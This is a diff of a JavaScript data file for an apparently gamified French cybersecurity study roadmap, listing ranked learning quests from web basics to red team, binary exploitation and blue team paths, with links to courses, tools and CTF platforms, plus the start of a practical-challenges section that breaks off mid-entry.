+        { id: 'd3-1', text: 'HTML / CSS / JavaScript de base' },
+        { id: 'd3-2', text: 'Architecture client-serveur, requête/réponse' },
+        { id: 'd3-3', text: 'Cookies, sessions, headers HTTP' },
+        { id: 'd3-4', text: 'AJAX, JSON, REST API' },
+      ],
+      resources: {
+        videos: [
+          v('HTML/CSS/JS (Traversy)', 'https://www.youtube.com/results?search_query=HTML+CSS+JavaScript+crash+course+traversy', 'EN'),
+          v('Comprendre HTTP (Grafikart)', 'https://www.grafikart.fr/tutoriels/protocole-http-743', 'FR'),
+        ],
+        platforms: [
+          v('MDN Web Docs (FR)', 'https://developer.mozilla.org/fr/docs/Learn', 'FR'),
+          v('freeCodeCamp', 'https://www.freecodecamp.org/', 'EN'),
+          v('OpenClassrooms — Web', 'https://openclassrooms.com/fr/courses/1603881-apprenez-a-creer-votre-site-web-avec-html5-et-css3', 'FR'),
+        ],
+        cheats: [
+          v('HTTP Headers (MDN)', 'https://developer.mozilla.org/fr/docs/Web/HTTP/Headers', 'FR'),
+        ],
+      }
+    },
+    {
+      id: 'd-main-4', type: 'main', icon: 'shield', xp: 80, title: 'Cryptographie — Les Bases',
+      objectives: [
+        { id: 'd4-1', text: 'Comprendre symétrique vs asymétrique (AES, RSA)' },
+        { id: 'd4-2', text: 'Hashes : MD5, SHA-256, bcrypt — différences et usages' },
+        { id: 'd4-3', text: 'Encodage vs chiffrement (Base64, URL encoding ≠ crypto)' },
+        { id: 'd4-4', text: 'Comprendre HTTPS / TLS / certificats X.509' },
+        { id: 'd4-5', text: 'Reconnaître les hashes courants (hash-identifier)' },
+      ],
+      resources: {
+        videos: [
+          v('Public Key Cryptography (Computerphile)', 'https://www.youtube.com/watch?v=GSIDS_lvRv4', 'EN'),
+          v('How HTTPS Works (Practical Networking)', 'https://www.youtube.com/results?search_query=how+HTTPS+TLS+works+practical+networking', 'EN'),
+          v('La crypto expliquée (FR)', 'https://www.youtube.com/results?search_query=cryptographie+expliquée+français', 'FR'),
+        ],
+        platforms: [
+          v('Cryptopals Challenges', 'https://cryptopals.com/', 'EN'),
+          v('CryptoHack', 'https://cryptohack.org/', 'EN'),
+          v('Root-Me — Crypto', 'https://www.root-me.org/fr/Challenges/Cryptanalyse/', 'FR'),
+        ],
+        articles: [
+          v('Practical Cryptography for Developers', 'https://cryptobook.nakov.com/', 'EN'),
+          v('ANSSI — Mécanismes cryptographiques', 'https://cyber.gouv.fr/publications/mecanismes-cryptographiques', 'FR'),
+        ],
+        tools: [
+          v('CyberChef ⭐ (le couteau suisse)', 'https://gchq.github.io/CyberChef/', 'EN'),
+          v('hash-identifier', 'https://github.com/blackploit/hash-identifier', 'EN'),
+          v('OpenSSL', 'https://www.openssl.org/', 'EN'),
+        ],
+        cheats: [
+          v('Hash Types Cheat Sheet', 'https://hashcat.net/wiki/doku.php?id=example_hashes', 'EN'),
+        ],
+      }
+    },
+    {
+      id: 'd-daily', type: 'daily', icon: 'flame', xp: 60, title: 'Daily Quests',
+      objectives: [
+        { id: 'dd-1', text: '1h de code Python minimum / jour' },
+        { id: 'dd-2', text: '1 challenge TryHackMe / HTB Academy' },
+        { id: 'dd-3', text: 'Lire 1 writeup de CVE récente' },
+      ],
+      resources: {
+        platforms: [
+          v('TryHackMe', 'https://tryhackme.com/', 'EN'),
+          v('HackTheBox Academy', 'https://academy.hackthebox.com/', 'EN'),
+          v('Root-Me', 'https://www.root-me.org/', 'FR'),
+        ],
+        articles: [
+          v('CVE Details', 'https://www.cvedetails.com/', 'EN'),
+          v('Exploit-DB', 'https://www.exploit-db.com/', 'EN'),
+        ],
+      }
+    },
+    {
+      id: 'd-boss', type: 'boss', icon: 'skull', xp: 400, title: 'BOSS — TryHackMe Pre-Security',
+      objectives: [
+        { id: 'db-1', text: 'Compléter parcours "Pre-Security"' },
+        { id: 'db-2', text: 'Compléter parcours "Intro to Cyber Security"' },
+        { id: 'db-3', text: 'Construire ton projet Python perso' },
+      ],
+      resources: {
+        platforms: [
+          v('THM Pre-Security', 'https://tryhackme.com/path/outline/presecurity', 'EN'),
+          v('THM Intro to Cyber', 'https://tryhackme.com/path/outline/introtocyber', 'EN'),
+        ],
+        videos: [
+          v('CryptoCat — THM walkthroughs', 'https://www.youtube.com/results?search_query=cryptocat+CTF+writeups', 'EN'),
+          v('TryHackMe en français', 'https://www.youtube.com/results?search_query=processus+thief+cybersécurité+hackthebox', 'FR'),
+        ],
+      }
+    },
+  ],
+  C: [
+    {
+      id: 'c-main-1', type: 'main', icon: 'eye', xp: 150, title: 'Recon & Scanning',
+      objectives: [
+        { id: 'c1-1', text: 'Nmap : scans TCP/UDP, OS detection, scripts NSE' },
+        { id: 'c1-2', text: 'Recon passif : Google dorking, Shodan, theHarvester' },
+        { id: 'c1-3', text: 'Énumération : Gobuster, ffuf, enum4linux, Nikto' },
+        { id: 'c1-4', text: 'OSINT basique : Maltego, Sherlock, recon-ng' },
+      ],
+      resources: {
+        videos: [
+          v('Nmap Tutorial (NetworkChuck)', 'https://www.youtube.com/results?search_query=nmap+tutorial+complete+networkchuck', 'EN'),
+          v('Nmap & Recon (FR)', 'https://www.youtube.com/results?search_query=waked+XY+hacking+français', 'FR'),
+          v('OSINT (HackerSploit)', 'https://www.youtube.com/results?search_query=OSINT+open+source+intelligence+hackersploit', 'EN'),
+          v('NahamSec — Bug Bounty Recon', 'https://www.youtube.com/@NahamSec', 'EN'),
+        ],
+        tools: [
+          v('Nmap', 'https://nmap.org/', 'EN'),
+          v('Shodan', 'https://www.shodan.io/', 'EN'),
+          v('theHarvester', 'https://github.com/laramies/theHarvester', 'EN'),
+          v('Gobuster', 'https://github.com/OJ/gobuster', 'EN'),
+          v('ffuf', 'https://github.com/ffuf/ffuf', 'EN'),
+          v('Maltego CE', 'https://www.maltego.com/ce-registration/', 'EN'),
+        ],
+        articles: [
+          v('Nmap Book', 'https://nmap.org/book/', 'EN'),
+          v('Google Dorks DB', 'https://www.exploit-db.com/google-hacking-database', 'EN'),
+          v('OSINT Framework', 'https://osintframework.com/', 'EN'),
+        ],
+        cheats: [
+          v('Nmap Cheat Sheet', 'https://www.stationx.net/nmap-cheat-sheet/', 'EN'),
+          v('Recon (HackTricks)', 'https://book.hacktricks.xyz/generic-methodologies-and-resources/external-recon-methodology', 'EN'),
+        ],
+      }
+    },
+    {
+      id: 'c-main-2', type: 'main', icon: 'bug', xp: 200, title: 'OWASP Top 10 — Vulnérabilités Web',
+      objectives: [
+        { id: 'c2-1', text: 'Injection SQL (sqlmap + à la main)' },
+        { id: 'c2-2', text: 'XSS (reflected, stored, DOM)' },
+        { id: 'c2-3', text: 'CSRF, SSRF' },
+        { id: 'c2-4', text: 'Broken authentication, IDOR' },
+        { id: 'c2-5', text: 'Path traversal, file upload exploits' },
+        { id: 'c2-6', text: 'XXE, deserialization, command injection' },
+      ],
+      resources: {
+        videos: [
+          v('XSS Explained (PwnFunction)', 'https://www.youtube.com/watch?v=EoaDgUgS6QA', 'EN'),
+          v('PwnFunction (chaîne complète)', 'https://www.youtube.com/@PwnFunction', 'EN'),
+          v('Web Hacking 101 (LiveOverflow)', 'https://www.youtube.com/results?search_query=web+hacking+liveoverflow+playlist', 'EN'),
+          v('Web Hacking (FR)', 'https://www.youtube.com/results?search_query=waked+XY+hacking+français', 'FR'),
+        ],
+        platforms: [
+          v('PortSwigger Web Academy ⭐', 'https://portswigger.net/web-security', 'EN'),
+          v('OWASP Juice Shop', 'https://owasp.org/www-project-juice-shop/', 'EN'),
+          v('DVWA', 'https://github.com/digininja/DVWA', 'EN'),
+          v('PentesterLab', 'https://pentesterlab.com/', 'EN'),
+        ],
+        articles: [
+          v('OWASP Top 10', 'https://owasp.org/www-project-top-ten/', 'EN'),
+          v('PayloadsAllTheThings ⭐', 'https://github.com/swisskyrepo/PayloadsAllTheThings', 'EN'),
+          v('HackTricks — Pentest Web', 'https://book.hacktricks.xyz/network-services-pentesting/pentesting-web', 'EN'),
+        ],
+        cheats: [
+          v('SQLi Cheat Sheet', 'https://portswigger.net/web-security/sql-injection/cheat-sheet', 'EN'),
+          v('XSS Cheat Sheet', 'https://portswigger.net/web-security/cross-site-scripting/cheat-sheet', 'EN'),
+          v('OWASP Cheat Sheets', 'https://cheatsheetseries.owasp.org/', 'EN'),
+        ],
+      }
+    },
+    {
+      id: 'c-main-3', type: 'main', icon: 'sword', xp: 150, title: 'Outils de Combat',
+      objectives: [
+        { id: 'c3-1', text: 'Burp Suite : Repeater, Intruder, Proxy' },
+        { id: 'c3-2', text: 'Metasploit Framework (msfconsole, modules)' },
+        { id: 'c3-3', text: 'John the Ripper / Hashcat (cracking)' },
+        { id: 'c3-4', text: 'Hydra (brute force protocoles)' },
+        { id: 'c3-5', text: 'netcat — couteau suisse réseau' },
+      ],
+      resources: {
+        videos: [
+          v('Burp Suite (Intigriti)', 'https://www.youtube.com/results?search_query=burp+suite+tutorial+intigriti+web+hacking', 'EN'),
+          v('Metasploit Crash Course', 'https://www.youtube.com/results?search_query=metasploit+framework+tutorial+beginners+hackersploit', 'EN'),
+          v('Burp Suite tutoriel (FR)', 'https://www.youtube.com/results?search_query=Hackintux+linux+cybersécurité', 'FR'),
+        ],
+        tools: [
+          v('Burp Suite Community', 'https://portswigger.net/burp/communitydownload', 'EN'),
+          v('Metasploit Framework', 'https://www.metasploit.com/', 'EN'),
+          v('John the Ripper', 'https://www.openwall.com/john/', 'EN'),
+          v('Hashcat', 'https://hashcat.net/hashcat/', 'EN'),
+          v('Hydra', 'https://github.com/vanhauser-thc/thc-hydra', 'EN'),
+        ],
+        cheats: [
+          v('Hashcat Wiki', 'https://hashcat.net/wiki/doku.php?id=hashcat', 'EN'),
+          v('Metasploit Cheat Sheet', 'https://www.tunnelsup.com/metasploit-cheat-sheet/', 'EN'),
+        ],
+      }
+    },
+    {
+      id: 'c-main-4', type: 'main', icon: 'wifi', xp: 130, title: 'Wireless / WiFi Hacking',
+      objectives: [
+        { id: 'c4-1', text: 'Comprendre WPA2/WPA3, 4-way handshake' },
+        { id: 'c4-2', text: 'Mode monitor & passer en mode injection (aircrack-ng suite)' },
+        { id: 'c4-3', text: 'Capture handshake WPA2 + cracking avec hashcat' },
+        { id: 'c4-4', text: 'Attaque Evil Twin / fake AP (sur TES propres réseaux)' },
+        { id: 'c4-5', text: 'Bluetooth basics (bluetoothctl, BlueZ)' },
+      ],
+      resources: {
+        videos: [
+          v('WiFi Hacking (David Bombal)', 'https://www.youtube.com/results?search_query=wifi+hacking+tutorial+aircrack-ng+david+bombal', 'EN'),
+          v('Aircrack-ng tutorial (HackerSploit)', 'https://www.youtube.com/results?search_query=aircrack-ng+wpa2+handshake+tutorial+hackersploit', 'EN'),
+          v('NetworkChuck WiFi hacking', 'https://www.youtube.com/results?search_query=wifi+hacking+networkchuck+wpa2', 'EN'),
+        ],
+        platforms: [
+          v('TryHackMe — Wifi Hacking 101', 'https://tryhackme.com/room/wifihacking101', 'EN'),
+          v('HackTheBox — Wireless modules', 'https://academy.hackthebox.com/', 'EN'),
+        ],
+        tools: [
+          v('Aircrack-ng suite', 'https://www.aircrack-ng.org/', 'EN'),
+          v('Wifite (automation)', 'https://github.com/derv82/wifite2', 'EN'),
+          v('Kismet (sniffer)', 'https://www.kismetwireless.net/', 'EN'),
+          v('Bettercap', 'https://www.bettercap.org/', 'EN'),
+        ],
+        articles: [
+          v('HackTricks — Pentesting Wifi', 'https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-wifi', 'EN'),
+          v('WPA2 Handshake expliqué', 'https://hashcat.net/forum/thread-7717.html', 'EN'),
+        ],
+        cheats: [
+          v('Aircrack-ng Cheat Sheet', 'https://www.aircrack-ng.org/doku.php?id=cracking_wpa', 'EN'),
+        ],
+      }
+    },
+    {
+      id: 'c-daily', type: 'daily', icon: 'flame', xp: 80, title: 'Daily Quests',
+      objectives: [
+        { id: 'cd-1', text: '1 box TryHackMe / HTB (easy)' },
+        { id: 'cd-2', text: '30 min PortSwigger Web Academy' },
+        { id: 'cd-3', text: "Documenter dans le Hunter's Journal" },
+      ],
+      resources: {
+        platforms: [
+          v('HackTheBox', 'https://www.hackthebox.com/', 'EN'),
+          v('TryHackMe', 'https://tryhackme.com/', 'EN'),
+          v('PortSwigger Academy', 'https://portswigger.net/web-security', 'EN'),
+          v('Obsidian', 'https://obsidian.md/', 'EN'),
+        ],
+      }
+    },
+    {
+      id: 'c-boss', type: 'boss', icon: 'skull', xp: 600, title: 'BOSS — 10 Easy Boxes HackTheBox',
+      objectives: [
+        { id: 'cb-1', text: 'Rooter 3 boxes easy HTB' },
+        { id: 'cb-2', text: 'Rooter 6 boxes easy HTB' },
+        { id: 'cb-3', text: 'Rooter 10 boxes easy HTB' },
+        { id: 'cb-4', text: 'BONUS : Passer eJPT' },
+      ],
+      resources: {
+        platforms: [
+          v('HackTheBox', 'https://www.hackthebox.com/', 'EN'),
+          v('eJPT', 'https://security.ine.com/certifications/ejpt-certification/', 'EN'),
+        ],
+        videos: [
+          v('IppSec — writeups HTB ⭐', 'https://www.youtube.com/@ippsec', 'EN'),
+          v('0xdf — writeups texte', 'https://0xdf.gitlab.io/', 'EN'),
+          v('Processus — HTB FR', 'https://www.youtube.com/results?search_query=processus+thief+cybersécurité+hackthebox', 'FR'),
+        ],
+      }
+    },
+  ],
+  B: [
+    {
+      id: 'b-main-1', type: 'main', icon: 'shield', xp: 250, title: 'Active Directory',
+      objectives: [
+        { id: 'b1-1', text: 'Comprendre Kerberos, NTLM, LDAP' },
+        { id: 'b1-2', text: "BloodHound — cartographier l'AD" },
+        { id: 'b1-3', text: 'Kerberoasting, AS-REP Roasting, Pass-the-Hash' },
+        { id: 'b1-4', text: 'Mimikatz, Rubeus, Impacket' },
+        { id: 'b1-5', text: 'ACL abuse (DCSync, GenericAll, etc.)' },
+      ],
+      resources: {
+        videos: [
+          v('AD Hacking (Conda)', 'https://www.youtube.com/results?search_query=active+directory+hacking+pentesting+tutorial', 'EN'),
+          v('AD Pentesting (HackerSploit)', 'https://www.youtube.com/results?search_query=active+directory+pentesting+hackersploit', 'EN'),
+          v('Active Directory Attacks (FR)', 'https://www.youtube.com/results?search_query=processus+thief+cybersécurité+hackthebox', 'FR'),
+        ],
+        platforms: [
+          v('THM Active Directory', 'https://tryhackme.com/module/active-directory', 'EN'),
+          v('HTB Pro Lab — Dante/Offshore', 'https://www.hackthebox.com/hacker/pro-labs', 'EN'),
+        ],
+        tools: [
+          v('BloodHound', 'https://github.com/BloodHoundAD/BloodHound', 'EN'),
+          v('Impacket', 'https://github.com/fortra/impacket', 'EN'),
+          v('Mimikatz', 'https://github.com/gentilkiwi/mimikatz', 'EN'),
+          v('Rubeus', 'https://github.com/GhostPack/Rubeus', 'EN'),
+          v('NetExec (CME)', 'https://github.com/Pennyw0rth/NetExec', 'EN'),
+        ],
+        articles: [
+          v('The Hacker Recipes ⭐', 'https://www.thehacker.recipes/', 'EN'),
+          v('HackTricks — AD', 'https://book.hacktricks.xyz/windows-hardening/active-directory-methodology', 'EN'),
+          v('ADSecurity.org', 'https://adsecurity.org/', 'EN'),
+        ],
+        cheats: [
+          v('AD Pentest Cheatsheet', 'https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet', 'EN'),
+        ],
+      }
+    },
+    {
+      id: 'b-main-2', type: 'main', icon: 'zap', xp: 250, title: 'Post-Exploitation & Pivoting',
+      objectives: [
+        { id: 'b2-1', text: 'Privesc Linux : LinPEAS, sudo, SUID, capabilities' },
+        { id: 'b2-2', text: 'Privesc Windows : WinPEAS, services, tokens' },
+        { id: 'b2-3', text: 'Pivoting : Chisel, Ligolo, SSH tunneling' },
+        { id: 'b2-4', text: 'Persistence : tasks, services, registry' },
+      ],
+      resources: {
+        videos: [
+          v('Linux Privesc (TCM)', 'https://www.youtube.com/results?search_query=linux+privilege+escalation+TCM+security', 'EN'),
+          v('Windows Privesc (Conda)', 'https://www.youtube.com/results?search_query=windows+privilege+escalation+tutorial', 'EN'),
+        ],
+        tools: [
+          v('PEASS-ng', 'https://github.com/carlospolop/PEASS-ng', 'EN'),
+          v('Chisel', 'https://github.com/jpillora/chisel', 'EN'),
+          v('Ligolo-ng', 'https://github.com/nicocha30/ligolo-ng', 'EN'),
+          v('GTFOBins', 'https://gtfobins.github.io/', 'EN'),
+          v('LOLBAS', 'https://lolbas-project.github.io/', 'EN'),
+        ],
+        articles: [
+          v('HackTricks — Linux Privesc', 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation', 'EN'),
+          v('HackTricks — Windows Privesc', 'https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation', 'EN'),
+          v('Pentest Book (six2dez)', 'https://pentestbook.six2dez.com/', 'EN'),
+        ],
+      }
+    },
+    {
+      id: 'b-main-3', type: 'main', icon: 'cpu', xp: 200, title: 'Reverse Engineering Basique',
+      objectives: [
+        { id: 'b3-1', text: 'Assembleur x86/x64 (savoir LIRE)' },
+        { id: 'b3-2', text: 'Ghidra ou IDA Free' },
+        { id: 'b3-3', text: 'Buffer overflows basiques (stack, sans ASLR)' },
+        { id: 'b3-4', text: 'GDB / pwndbg' },
+      ],
+      resources: {
+        videos: [
+          v('LiveOverflow ⭐', 'https://www.youtube.com/results?search_query=web+hacking+liveoverflow+playlist', 'EN'),
+          v('MalwareTechBlog', 'https://www.youtube.com/@MalwareTechBlog', 'EN'),
+          v('Reverse Engineering (FR)', 'https://www.youtube.com/results?search_query=reverse+engineering+français+débutant', 'FR'),
+        ],
+        tools: [
+          v('Ghidra', 'https://ghidra-sre.org/', 'EN'),
+          v('IDA Free', 'https://hex-rays.com/ida-free/', 'EN'),
+          v('Cutter', 'https://cutter.re/', 'EN'),
+          v('pwndbg', 'https://github.com/pwndbg/pwndbg', 'EN'),
+        ],
+        platforms: [
+          v('crackmes.one', 'https://crackmes.one/', 'EN'),
+          v('pwn.college', 'https://pwn.college/', 'EN'),
+        ],
+        articles: [
+          v('begin.re — Reverse Engineering', 'https://www.begin.re/', 'EN'),
+        ],
+      }
+    },
+    {
+      id: 'b-main-4', type: 'main', icon: 'globe', xp: 220, title: 'Cloud Security Basics',
+      objectives: [
+        { id: 'b4-1', text: 'Comprendre AWS / Azure / GCP — modèle IAM' },
+        { id: 'b4-2', text: 'S3 buckets misconfigs (public read, listing)' },
+        { id: 'b4-3', text: 'IAM privilege escalation (Pacu, ScoutSuite)' },
+        { id: 'b4-4', text: 'Docker basics + container escape concepts' },
+        { id: 'b4-5', text: 'Kubernetes : pods, services, attaques courantes' },
+      ],
+      resources: {
+        videos: [
+          v('AWS Security (Beau Bullock)', 'https://www.youtube.com/results?search_query=AWS+security+pentesting+beau+bullock', 'EN'),
+          v('Cloud Pentest 101 (HackerSploit)', 'https://www.youtube.com/results?search_query=cloud+penetration+testing+AWS+azure+hackersploit', 'EN'),
+          v('Docker pour les hackers (NetworkChuck)', 'https://www.youtube.com/results?search_query=docker+for+hackers+networkchuck+tutorial', 'EN'),
+        ],
+        platforms: [
+          v('flAWS Challenge ⭐ (AWS CTF)', 'http://flaws.cloud/', 'EN'),
+          v('flAWS 2', 'http://flaws2.cloud/', 'EN'),
+          v('CloudGoat (vulnerable AWS)', 'https://github.com/RhinoSecurityLabs/cloudgoat', 'EN'),
+          v('Kubernetes Goat', 'https://github.com/madhuakula/kubernetes-goat', 'EN'),
+          v('TryHackMe Cloud Path', 'https://tryhackme.com/path/outline/cloud', 'EN'),
+        ],
+        tools: [
+          v('Pacu (AWS exploitation)', 'https://github.com/RhinoSecurityLabs/pacu', 'EN'),
+          v('ScoutSuite (multi-cloud audit)', 'https://github.com/nccgroup/ScoutSuite', 'EN'),
+          v('Prowler (AWS audit)', 'https://github.com/prowler-cloud/prowler', 'EN'),
+          v('kube-hunter', 'https://github.com/aquasecurity/kube-hunter', 'EN'),
+        ],
+        articles: [
+          v('HackTricks — Cloud Pentesting ⭐', 'https://cloud.hacktricks.xyz/', 'EN'),
+          v('AWS Customer Security Best Practices', 'https://aws.amazon.com/architecture/security-identity-compliance/', 'EN'),
+          v('Container Security 101', 'https://www.cncf.io/blog/2022/06/07/container-security-101/', 'EN'),
+        ],
+        cheats: [
+          v('AWS Security Cheat Sheet', 'https://github.com/toniblyx/my-arsenal-of-aws-security-tools', 'EN'),
+        ],
+      }
+    },
+    {
+      id: 'b-daily', type: 'daily', icon: 'flame', xp: 100, title: 'Daily Quests',
+      objectives: [
+        { id: 'bd-1', text: '1 box HTB medium ou Pro Lab' },
+        { id: 'bd-2', text: '1 technique MITRE ATT&CK' },
+        { id: 'bd-3', text: "Hunter's Journal à jour" },
+      ],
+      resources: {
+        platforms: [
+          v('MITRE ATT&CK', 'https://attack.mitre.org/', 'EN'),
+          v('HackTheBox', 'https://www.hackthebox.com/', 'EN'),
+        ],
+      }
+    },
+    {
+      id: 'b-boss', type: 'boss', icon: 'skull', xp: 1000, title: 'BOSS — OSCP ou Pro Lab',
+      objectives: [
+        { id: 'bb-1', text: "Préparer l'OSCP (PEN-200)" },
+        { id: 'bb-2', text: 'OU Pro Lab Dante / Offshore' },
+        { id: 'bb-3', text: "Passer et réussir l'examen" },
+      ],
+      resources: {
+        platforms: [
+          v('OffSec PEN-200 (OSCP)', 'https://www.offsec.com/courses/pen-200/', 'EN'),
+          v('HTB Pro Labs', 'https://www.hackthebox.com/hacker/pro-labs', 'EN'),
+          v('TJnull OSCP-like list', 'https://www.netsecfocus.com/oscp/2021/05/06/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PEN-200_PWK_OSCP_2.0.html', 'EN'),
+        ],
+        videos: [
+          v('IppSec — OSCP-like', 'https://www.youtube.com/@ippsec', 'EN'),
+        ],
+      }
+    },
+  ],
+  A: [
+    {
+      id: 'a-path-1', type: 'path', icon: 'bug', xp: 500, title: 'VOIE 1 — Spectre du Web (Bug Bounty)',
+      objectives: [
+        { id: 'a1-1', text: 'TOUS les labs PortSwigger Web Academy' },
+        { id: 'a1-2', text: "\"Web Application Hacker's Handbook\"" },
+        { id: 'a1-3', text: 'Bug Bounty actif (HackerOne, YesWeHack)' },
+        { id: 'a1-4', text: 'Premier paiement de bounty' },
+      ],
+      resources: {
+        videos: [
+          v('NahamSec ⭐', 'https://www.youtube.com/@NahamSec', 'EN'),
+          v('STÖK — Bug Bounty stories', 'https://www.youtube.com/@STOKfredrik', 'EN'),
+          v('InsiderPhD', 'https://www.youtube.com/@InsiderPhD', 'EN'),
+          v('Bug Bounty (FR)', 'https://www.youtube.com/results?search_query=waked+XY+hacking+français', 'FR'),
+        ],
+        platforms: [
+          v('HackerOne', 'https://hackerone.com/', 'EN'),
+          v('Bugcrowd', 'https://www.bugcrowd.com/', 'EN'),
+          v('YesWeHack', 'https://www.yeswehack.com/', 'FR'),
+          v('Intigriti', 'https://www.intigriti.com/', 'EN'),
+        ],
+        articles: [
+          v('Bug Bounty Methodology (Haddix)', 'https://github.com/jhaddix/tbhm', 'EN'),
+          v('HackerOne Hacktivity', 'https://hackerone.com/hacktivity', 'EN'),
+        ],
+      }
+    },
+    {
+      id: 'a-path-2', type: 'path', icon: 'sword', xp: 500, title: 'VOIE 2 — Maître du Réseau (Red Team)',
+      objectives: [
+        { id: 'a2-1', text: 'Certified Red Team Operator (CRTO)' },
+        { id: 'a2-2', text: 'Cobalt Strike, Sliver, Mythic' },
+        { id: 'a2-3', text: 'Évasion EDR/AV, AMSI bypass' },
+        { id: 'a2-4', text: 'OPSEC en engagement' },
+      ],
+      resources: {
+        platforms: [
+          v('CRTO (Zero-Point)', 'https://training.zeropointsecurity.co.uk/courses/red-team-ops', 'EN'),
+          v('Maldev Academy', 'https://maldevacademy.com/', 'EN'),
+        ],
+        articles: [
+          v('ired.team ⭐', 'https://www.ired.team/', 'EN'),
+          v('Sektor7', 'https://institute.sektor7.net/', 'EN'),
+        ],
+        tools: [
+          v('Sliver C2', 'https://github.com/BishopFox/sliver', 'EN'),
+          v('Mythic C2', 'https://github.com/its-a-feature/Mythic', 'EN'),
+        ],
+        videos: [
+          v('Red Team & Pentest (FR)', 'https://www.youtube.com/results?search_query=processus+thief+cybersécurité+hackthebox', 'FR'),
+        ],
+      }
+    },
+    {
+      id: 'a-path-3', type: 'path', icon: 'cpu', xp: 500, title: 'VOIE 3 — Démon du Binaire',
+      objectives: [
+        { id: 'a3-1', text: 'Reverse engineering avancé (malware analysis)' },
+        { id: 'a3-2', text: 'Exploit dev (ROP, heap, kernel)' },
+        { id: 'a3-3', text: 'OSED' },
+        { id: 'a3-4', text: 'Contribuer à un projet open-source' },
+      ],
+      resources: {
+        platforms: [
+          v('OSED', 'https://www.offsec.com/courses/exp-301/', 'EN'),
+          v('pwn.college', 'https://pwn.college/', 'EN'),
+          v('ROP Emporium', 'https://ropemporium.com/', 'EN'),
+        ],
+        videos: [
+          v('LiveOverflow ⭐', 'https://www.youtube.com/@LiveOverflow', 'EN'),
+          v('OALabs (malware)', 'https://www.youtube.com/@OALabs', 'EN'),
+        ],
+        articles: [
+          v('Practical Malware Analysis', 'https://nostarch.com/malware', 'EN'),
+          v('Corelan tutorials', 'https://www.corelan.be/index.php/articles/', 'EN'),
+        ],
+      }
+    },
+    {
+      id: 'a-path-4', type: 'path', icon: 'shield', xp: 500, title: 'VOIE 4 — Le Gardien (Blue Team)',
+      objectives: [
+        { id: 'a4-1', text: "SIEM (Splunk, ELK)" },
+        { id: 'a4-2', text: 'Threat hunting, Volatility' },
+        { id: 'a4-3', text: 'GCFA, GCIH ou BTL2' },
+        { id: 'a4-4', text: 'Home-lab avec détection complète' },
+      ],
+      resources: {
+        platforms: [
+          v('Blue Team Level 2', 'https://securityblue.team/', 'EN'),
+          v('LetsDefend', 'https://letsdefend.io/', 'EN'),
+          v('THM SOC Path', 'https://tryhackme.com/path/outline/soclevel1', 'EN'),
+        ],
+        tools: [
+          v('Volatility', 'https://www.volatilityfoundation.org/', 'EN'),
+          v('Wazuh', 'https://wazuh.com/', 'EN'),
+          v('Velociraptor', 'https://docs.velociraptor.app/', 'EN'),
+        ],
+        articles: [
+          v('SANS Reading Room', 'https://www.sans.org/white-papers/', 'EN'),
+          v('DFIR Report', 'https://thedfirreport.com/', 'EN'),
+        ],
+      }
+    },
+    {
+      id: 'a-boss', type: 'boss', icon: 'skull', xp: 1500, title: 'BOSS — Devenir une Vraie Menace',
+      objectives: [
+        { id: 'ab-1', text: 'Certif avancée (OSEP/OSWE/OSED/GCFA)' },
+        { id: 'ab-2', text: 'Publier : blog, writeups, outils' },
+        { id: 'ab-3', text: 'Premier contrat / bounty / job' },
+      ],
+      resources: {
+        platforms: [
+          v('OffSec advanced certs', 'https://www.offsec.com/courses-and-certifications/', 'EN'),
+          v('SANS GIAC', 'https://www.giac.org/', 'EN'),
+        ],
+      }
+    },
+  ],
+  S: [
+    {
+      id: 's-monarch', type: 'main', icon: 'trophy', xp: 2000, title: 'Quêtes du Monarque',
+      objectives: [
+        { id: 's1-1', text: 'Trouver et publier ton premier CVE' },
+        { id: 's1-2', text: 'Maintenir un outil open-source utilisé' },
+        { id: 's1-3', text: 'Parler à une conf (DEF CON, Le Hack, NorthSec)' },
+        { id: 's1-4', text: 'Mentorer la prochaine génération' },
+        { id: 's1-5', text: 'Bug Bounty top tier OU Red Team senior' },
+      ],
+      resources: {
+        platforms: [
+          v('CVE List (MITRE)', 'https://cve.mitre.org/', 'EN'),
+          v('Le Hack (Paris)', 'https://lehack.org/', 'FR'),
+          v('NorthSec', 'https://nsec.io/', 'EN'),
+          v('DEF CON', 'https://defcon.org/', 'EN'),
+        ],
+        articles: [
+          v('Synacktiv research', 'https://www.synacktiv.com/publications', 'FR'),
+        ],
+      }
+    },
+    {
+      id: 's-ritual', type: 'daily', icon: 'flame', xp: 200, title: 'Rituel Permanent',
+      objectives: [
+        { id: 's2-1', text: 'Veille tech quotidienne' },
+        { id: 's2-2', text: '1 paper de recherche par semaine' },
+        { id: 's2-3', text: 'Coder. Toujours coder.' },
+        { id: 's2-4', text: "Garder l'éthique. Rester White Hat." },
+      ],
+      resources: {
+        articles: [
+          v('Hacker News', 'https://news.ycombinator.com/', 'EN'),
+          v('r/netsec', 'https://www.reddit.com/r/netsec/', 'EN'),
+          v('arXiv cs.CR', 'https://arxiv.org/list/cs.CR/recent', 'EN'),
+          v('Synacktiv (FR)', 'https://www.synacktiv.com/publications', 'FR'),
+        ],
+      }
+    },
+  ],
+};
+
+// ============= CHALLENGES — DÉFIS PRATIQUES =============
+// Helper : c = challenge court, l = challenge long
+// { id, title, time, desc, validate, hint, solution }
+const c = (id, title, time, desc, validate, hint, solution) => ({ id, title, time, desc, validate, hint, solution, type: 'short' });
+const l = (id, title, time, desc, validate, hint, solution) => ({ id, title, time, desc, validate, hint, solution, type: 'long' });
+
+const CHALLENGES = {
+  // ============= RANG E =============
+  'e-main-1': [
+    c('em1c1', 'Installer Linux dans une VM', '30 min',
+      "Télécharge VirtualBox (gratuit) et installe Ubuntu 22.04 ou Linux Mint dans une VM. Démarre-la et connecte-toi avec ton user.",
+      "Tu es loggé dans Ubuntu et tu vois le bureau. Ouvre un terminal (Ctrl+Alt+T).",
+      "VirtualBox > New > donne un nom > choisis Linux/Ubuntu 64bit > 4Go RAM minimum > 25Go disque dynamique > monte l'ISO Ubuntu en disque optique > démarre.",
+      "1. Télécharge VirtualBox: virtualbox.org/wiki/Downloads\n2. Télécharge l'ISO Ubuntu: ubuntu.com/download/desktop\n3. VirtualBox > Nouvelle machine > Linux/Ubuntu 64-bit\n4. RAM 4096 MB, disque 25Go dynamique\n5. Settings > Stockage > Vide > insère l'ISO Ubuntu\n6. Démarre, suis l'installateur, redémarre, login."),
+    c('em1c2', 'Survie en ligne de commande', '20 min',
